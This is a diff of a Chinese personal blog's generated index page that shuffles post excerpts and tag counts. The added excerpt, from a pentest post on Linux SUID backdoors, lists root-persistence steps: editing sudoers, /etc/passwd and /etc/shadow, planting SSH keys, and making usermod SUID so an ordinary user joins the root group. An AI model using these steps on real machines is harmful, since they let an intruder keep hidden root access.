@@ -66,70 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2016/ubuntu-build-blog-in-github/">Ubuntu下用github搭建博客</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2016-05-09
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/git">Git</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/git">git</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        环境：ubuntu14.04.4
-0x00 安装hugo  在https://github.com/spf13/hugo/releases 下载hugo的deb安装包
- 安装hugo
-reber@ubuntu:~/Downloads$ sudo dpkg -i hug_015_amd64
- 生成站点
-  reber@ubuntu:~/Downloads$ cd /home/reber reber@ubuntu:~$ hugo new site reber-9.com #新建站点 #启动站点,访问localhost:1313测试有没有成功 reber@ubuntu:~/reber-9.com$ hugo server -w  0x01 配置github  安装git  reber@ubuntu:~$ sudo apt-get install git reber@ubuntu:~$ git --version #查看版本判断是否安装成功   安装ssh  reber@ubuntu:~/reber-9.com$ sudo apt-get install ssh   备份并创建本地ssh
-  reber@ubuntu:~/reber-9.com$ cd /home/reber/.ssh/ reber@ubuntu:~/.ssh$ mkdir ras.bak reber@ubuntu:~/.ssh$ cp id_ras* rsa.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/ubuntu-build-blog-in-github/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="http://wyb0.com/posts/2016/ubuntu-insatll-sublime-text3/">Ubuntu下安装sublime text 3</a></h2>
 
         
@@ -196,7 +132,7 @@ sudo apt-get install sublime-text-installer
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2016/ubuntu-basis-set/">Ubuntu初接触(包括搭建LAMP)</a></h2>
+        <h2><a href="http://wyb0.com/posts/2016/ubuntu-build-lamp/">Ubuntu 搭建 LAMP</a></h2>
 
         
         <div class="post-meta">
@@ -251,7 +187,7 @@ reber@ubuntu:~$ vim /etc/apt/sources.list
 
     
     <footer>
-        <a href="/posts/2016/ubuntu-basis-set/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+        <a href="/posts/2016/ubuntu-build-lamp/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
     </footer>
     
 </article>
@@ -687,6 +623,70 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/2016/linux-suid-back-door/">Linux之SUID后门</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-04-18
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/backdoor">backdoor</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
+0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
+ vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
+ vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
+# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
+[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
+[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/linux-suid-back-door/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
 
             
 
@@ -739,7 +739,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/other" title="other">other(16)</a>
+                <a href="http://wyb0.com/topics/other" title="other">other(14)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -754,7 +754,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/python" title="python">python(36)</a>
+                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -870,11 +870,6 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
                 <sup>3</sup>
             </p>
@@ -886,7 +881,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/module" title="module">module</a>
-                <sup>14</sup>
+                <sup>13</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -915,11 +910,6 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
                 <sup>1</sup>
             </p>
@@ -931,7 +921,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/python" title="python">python</a>
-                <sup>34</sup>
+                <sup>33</sup>
             </p>
         
             <p style="display:inline-block;">
